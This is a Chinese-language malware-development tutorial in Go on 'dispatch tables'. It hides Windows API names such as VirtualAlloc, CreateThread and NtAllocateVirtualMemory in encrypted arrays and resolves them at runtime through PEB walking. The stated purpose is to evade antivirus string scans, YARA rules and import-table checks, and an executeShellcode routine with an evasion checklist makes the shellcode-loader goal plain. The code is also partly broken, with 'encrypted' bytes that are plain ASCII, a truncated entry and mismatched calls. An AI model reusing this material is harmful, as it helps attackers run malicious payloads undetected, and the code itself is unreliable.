# 分发表（Dispatch Table）

## 原理

分发表是一种API字符串混淆技术，将敏感API名称存储在加密数组中，通过索引而非直接字符串来分发和调用API。运行时根据索引解密对应的API名称，避免在代码中出现敏感字符串特征。

**核心思想：**
- 不直接使用API字符串名称
- 将API名称加密存储在表中
- 通过索引号获取API名称
- 运行时解密并动态获取API地址

**优势：**
- 代码中没有明文API字符串
- 规避杀软对敏感API名称的静态扫描
- 与API Hash结合使用效果更好

---

## 基本结构

```
分发表结构：
┌─────────────────────────────────────────┐
│  Index  │  Encrypted API Name  │  Key   │
├─────────────────────────────────────────┤
│    0    │  [加密的"VirtualAlloc"] │ Key0 │
│    1    │  [加密的"CreateThread"] │ Key1 │
│    2    │  [加密的"WriteProcessMemory"] │ Key2 │
│   ...   │          ...          │ ...  │
└─────────────────────────────────────────┘

运行时：
Index → 解密表项 → API名称字符串 → GetProcAddress → API地址
```

---

## Go实现（基础版）

```go
package main

import (
    "golang.org/x/sys/windows"
    "unsafe"
)

// 加密的API名称表（XOR加密）
var encryptedAPITable = [][]byte{
    {0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63}, // XOR加密的"VirtualAlloc"
    {0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64}, // XOR加密的"CreateThread"
    {0x4E, 0x74, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x56, 0x69}, // XOR加密的"NtAllocateVirtualMemory"
}

// 解密密钥表
var decryptKeys = []byte{
    0x01, // Key for index 0
    0x02, // Key for index 1
    0x03, // Key for index 2
}

// API索引常量
const (
    API_VIRTUAL_ALLOC       = 0
    API_CREATE_THREAD       = 1
    API_NT_ALLOCATE_VIRTUAL = 2
)

// 分发表解密函数
func decryptAPIName(index int) string {
    encrypted := encryptedAPITable[index]
    key := decryptKeys[index]

    decrypted := make([]byte, len(encrypted))
    for i := 0; i < len(encrypted); i++ {
        decrypted[i] = encrypted[i] ^ key
    }

    return string(decrypted)
}

// 通过分发表获取API地址
func getAPIFromDispatchTable(moduleBase uintptr, apiIndex int) uintptr {
    // 解密API名称
    apiName := decryptAPIName(apiIndex)

    // 转换为UTF8指针
    apiNamePtr, _ := windows.BytePtrFromString(apiName)

    // 通过导出表获取API地址（不使用GetProcAddress）
    return getProcAddressByExportTable(moduleBase, apiNamePtr)
}

// 使用示例
func main() {
    kernel32 := getModuleBaseByPEB("kernel32.dll")
    ntdll := getModuleBaseByPEB("ntdll.dll")

    // 通过分发表获取VirtualAlloc
    virtualAlloc := getAPIFromDispatchTable(kernel32, API_VIRTUAL_ALLOC)

    // 通过分发表获取CreateThread
    createThread := getAPIFromDispatchTable(kernel32, API_CREATE_THREAD)

    // 通过分发表获取NtAllocateVirtualMemory
    ntAllocateVirtualMemory := getAPIFromDispatchTable(ntdll, API_NT_ALLOCATE_VIRTUAL)

    // 使用获取的API...
    addr, _, _ := syscall.SyscallN(virtualAlloc, 0, uintptr(len(shellcode)), 0x3000, 0x40)
}
```

---

## Go实现（多层加密版）

```go
package main

import (
    "encoding/base64"
)

// Base64 + XOR 双重加密的API名称表
var encodedAPITable = []string{
    "VmlydHVhbEFsbG9j",  // Base64(VirtualAlloc)
    "Q3JlYXRlVGhyZWFk",  // Base64(CreateThread)
    "TnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnk=", // Base64(NtAllocateVirtualMemory)
}

// XOR二次加密密钥
var xorKey = []byte{0x5A, 0x3C, 0x7F}

// 分发表结构体
type DispatchEntry struct {
    EncryptedName []byte
    Key           []byte
    Module        string
}

// 完整分发表
var dispatchTable = []DispatchEntry{
    {[]byte("VmlydHVhbEFsbG9j"), []byte{0x5A}, "kernel32.dll"},
    {[]byte("Q3JlYXRlVGhyZWFk"), []byte{0x5A}, "kernel32.dll"},
    {[]byte("TnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnk="), []byte{0x5A}, "ntdll.dll"},
}

// 多层解密函数
func decryptAPIMultiLayer(entry DispatchEntry) string {
    // 第一步：Base64解码
    decoded, _ := base64.StdEncoding.DecodeString(string(entry.EncryptedName))

    // 第二步：XOR解密
    decrypted := make([]byte, len(decoded))
    for i := 0; i < len(decoded); i++ {
        decrypted[i] = decoded[i] ^ entry.Key[i % len(entry.Key)]
    }

    return string(decrypted)
}

// 通过分发表获取API
func getAPIByDispatch(entry DispatchEntry) uintptr {
    moduleBase := getModuleBaseByPEB(entry.Module)
    apiName := decryptAPIMultiLayer(entry)
    apiNamePtr, _ := windows.BytePtrFromString(apiName)
    return getProcAddressByExportTable(moduleBase, apiNamePtr)
}
```

---

## Go实现（随机索引混淆版）

```go
package main

// 使用随机索引映射，增加分析难度
// 真实索引与显示索引不对应

var obfuscatedIndexMap = map[int]int{
    0xA7: 0,  // VirtualAlloc
    0xB3: 1,  // CreateThread
    0xC9: 2,  // NtAllocateVirtualMemory
    0xD5: 3,  // NtWriteVirtualMemory
    0xE1: 4,  // NtCreateThreadEx
}

// 通过混淆索引获取真实索引
func getRealIndex(obfuscatedIndex int) int {
    return obfuscatedIndexMap[obfuscatedIndex]
}

// 使用混淆索引获取API
func getAPIByObfuscatedIndex(obfuscatedIndex int) uintptr {
    realIndex := getRealIndex(obfuscatedIndex)
    return getAPIFromDispatchTable(realIndex)
}

// 使用示例（代码中不出现有规律的索引）
func executeShellcode(sc []byte) {
    // 使用混淆索引获取API
    virtualAlloc := getAPIByObfuscatedIndex(0xA7)  // 实际获取VirtualAlloc
    createThread := getAPIByObfuscatedIndex(0xB3)  // 实际获取CreateThread

    // 调用API
    addr, _, _ := syscall.SyscallN(virtualAlloc, ...)
    syscall.SyscallN(createThread, ...)
}
```

---

## 与其他技术结合

### 1. 分发表 + API Hash

```go
// 分发表解密后计算Hash，与目标Hash比对
func getAPIByDispatchAndHash(moduleBase uintptr, apiIndex int, expectedHash uint32) uintptr {
    apiName := decryptAPIName(apiIndex)
    actualHash := djb2Hash(apiName)

    if actualHash != expectedHash {
        return 0 // Hash校验失败
    }

    return getProcAddressByExportTable(moduleBase, apiName)
}
```

### 2. 分发表 + 栈字符串

```go
// 运行时在栈上构建API名称
func buildAPINameOnStack(index int) string {
    encrypted := encryptedAPITable[index]
    key := decryptKeys[index]

    // 在栈上分配
    var nameBuffer [64]byte

    for i := 0; i < len(encrypted); i++ {
        nameBuffer[i] = encrypted[i] ^ key
    }

    return string(nameBuffer[:len(encrypted)])
}
```

### 3. 分发表 + PEB Walk

```go
// 分发表解密 + PEB Walk获取模块 + 导出表遍历获取API
func getAPIComplete(apiIndex int) uintptr {
    // 1. 解密API名称
    apiName := decryptAPIName(apiIndex)

    // 2. 解密模块名称
    moduleName := decryptModuleName(moduleIndex)

    // 3. PEB Walk获取模块基址
    moduleBase := getModuleBaseByPEB(moduleName)

    // 4. 导出表遍历获取API地址
    return getProcAddressByExportTable(moduleBase, apiName)
}
```

---

## API表设计建议

### 敏感API分组

```go
// 内存操作组
const (
    API_VIRTUAL_ALLOC     = 0x00
    API_VIRTUAL_PROTECT   = 0x01
    API_VIRTUAL_FREE      = 0x02
    API_RTL_MOVE_MEMORY   = 0x03
)

// 进程操作组
const (
    API_OPEN_PROCESS      = 0x10
    API_CREATE_PROCESS    = 0x11
    API_TERMINATE_PROCESS = 0x12
)

// 线程操作组
const (
    API_CREATE_THREAD     = 0x20
    API_CREATE_REMOTE_THREAD = 0x21
    API_QUEUE_USER_APC    = 0x22
)

// NT函数组
const (
    API_NT_ALLOCATE_VIRTUAL = 0x30
    API_NT_WRITE_VIRTUAL    = 0x31
    API_NT_CREATE_THREAD    = 0x32
)
```

---

## 检测规避要点

| 检测点 | 规避方法 |
|--------|----------|
| 静态字符串扫描 | 加密存储API名称 |
| YARA规则匹配 | 分散API名称，不集中存储 |
| 导入表特征 | 使用动态获取，不依赖导入表 |
| 调用栈分析 | 结合栈字符串使用 |

---

## 注意事项

1. **加密强度**：不要使用简单单字节XOR，推荐AES或多轮XOR
2. **密钥管理**：密钥分散存储，不集中暴露
3. **索引混淆**：使用随机索引映射增加分析难度
4. **表大小控制**：不要包含过多API，按需动态扩展
5. **与Hash结合**：解密后使用Hash比对，不直接使用字符串